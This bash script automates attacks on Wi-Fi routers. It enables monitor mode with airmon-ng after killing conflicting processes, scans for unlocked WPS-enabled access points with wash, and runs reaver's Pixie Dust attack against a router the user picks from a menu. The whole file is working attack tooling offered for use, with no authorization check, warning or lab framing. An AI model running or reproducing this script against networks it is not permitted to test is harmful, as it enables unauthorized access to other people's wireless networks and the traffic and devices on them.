#!/bin/bash
# WPS Auto Attack Script for Termux + Debian (proot)

iface=""

function enable_monitor_mode() {
    echo "[*] Detecting wireless interfaces..."
    iw dev | awk '$1=="Interface"{print $2}' > interfaces.txt
    mapfile -t interfaces < interfaces.txt

    if [ ${#interfaces[@]} -eq 0 ]; then
        echo "[!] No wireless interface found. Is your USB Wi-Fi plugged in and supported?"
        exit 1
    fi

    echo
    echo "Found interfaces:"
    for i in "${!interfaces[@]}"; do
        echo "$i) ${interfaces[$i]}"
    done

    read -p "Select interface to put in monitor mode [0-${#interfaces[@]}]: " idx
    if [[ "$idx" =~ ^[0-9]+$ ]] && [ "$idx" -lt "${#interfaces[@]}" ]]; then
        iface="${interfaces[$idx]}"
    else
        echo "[!] Invalid selection."
        exit 1
    fi

    echo "[*] Stopping conflicting processes..."
    airmon-ng check kill

    echo "[*] Enabling monitor mode on $iface..."
    airmon-ng start "$iface"

    new_iface="${iface}mon"
    if ip link show "$new_iface" > /dev/null 2>&1; then
        iface="$new_iface"
    fi

    echo "[*] Monitor mode enabled: $iface"
}

function scan_targets() {
    echo "[*] Scanning for WPS-enabled access points..."
    timeout 15s wash -i "$iface" -C > wash_output.txt 2>/dev/null
    echo

    mapfile -t filtered < <(awk 'NR>2 && $1 != "" && $6 != "Locked" {print $0}' wash_output.txt)

    if [ ${#filtered[@]} -eq 0 ]; then
        echo "[!] No WPS-enabled routers found (or all locked)."
        return 1
    fi

    > filtered_output.txt
    echo "[*] WPS-enabled targets found:"
    printf "%-3s %-20s %-8s %-8s %-10s %-8s\n" "No" "BSSID" "CH" "RSSI" "WPS" "Locked"
    echo "--------------------------------------------------------------"
    idx=1
    for line in "${filtered[@]}"; do
        bssid=$(echo "$line" | awk '{print $1}')
        ch=$(echo "$line" | awk '{print $2}')
        rssi=$(echo "$line" | awk '{print $3}')
        locked=$(echo "$line" | awk '{print $6}')
        printf "%-3s %-20s %-8s %-8s %-10s %-8s\n" "$idx" "$bssid" "$ch" "$rssi" "Yes" "$locked"
        echo "$line" >> filtered_output.txt
        ((idx++))
    done
}

function select_target() {
    if [ ! -f filtered_output.txt ]; then
        echo "[!] No target list found. Run scan first."
        return 1
    fi

    mapfile -t targets < filtered_output.txt
    if [ ${#targets[@]} -eq 0 ]; then
        echo "[!] No valid targets in list."
        return 1
    fi

    echo
    echo "Select a target to attack:"
    for i in "${!targets[@]}"; do
        bssid=$(echo "${targets[$i]}" | awk '{print $1}')
        ch=$(echo "${targets[$i]}" | awk '{print $2}')
        essid=$(echo "${targets[$i]}" | awk '{for(i=7;i<=NF;++i) printf $i " "; print ""}')
        echo "$((i+1))) $bssid - CH:$ch - ESSID:$essid"
    done

    read -p "Target number: " sel
    if [[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -gt 0 ] && [ "$sel" -le ${#targets[@]} ]; then
        target="${targets[$((sel-1))]}"
        bssid=$(echo "$target" | awk '{print $1}')
        channel=$(echo "$target" | awk '{print $2}')
        echo "[*] Attacking $bssid on channel $channel..."
        run_reaver "$bssid" "$channel"
    else
        echo "[!] Invalid selection."
    fi
}

function run_reaver() {
    bssid="$1"
    channel="$2"
    echo "[*] Launching Reaver with PixieWPS..."
    reaver -i "$iface" -b "$bssid" -c "$channel" -K 1 -N -vv -d 15
}

function main_menu() {
    enable_monitor_mode
    while true; do
        echo
        echo "==== WPS Auto Attack Menu ===="
        echo "1) Scan WPS-enabled targets"
        echo "2) Select & attack target"
        echo "3) Exit"
        read -p "Choice: " choice
        case $choice in
            1) scan_targets ;;
            2) select_target ;;
            3) echo "Goodbye."; exit 0 ;;
            *) echo "[!] Invalid choice." ;;
        esac
    done
}

main_menu
